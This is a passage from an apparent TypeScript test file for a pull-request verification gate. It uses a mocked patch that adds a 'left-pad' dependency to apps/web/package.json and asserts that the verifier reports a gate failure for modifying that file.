            patch: '@@ -1 +1 @@\n+    "left-pad": "1.3.0",',
          },
        ],
      },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.changedPaths, ["apps/web/package.json"]);
  assertEquals(result.postJobFailures, []);
  const verified = verifyRun(
    policy,
    run(),
    jobs,
    [pull()],
    result.changedPaths,
    expected,
  );
  assertEquals(verified.failures, [
    "gate: candidate modifies apps/web/package.json",
  ]);
});
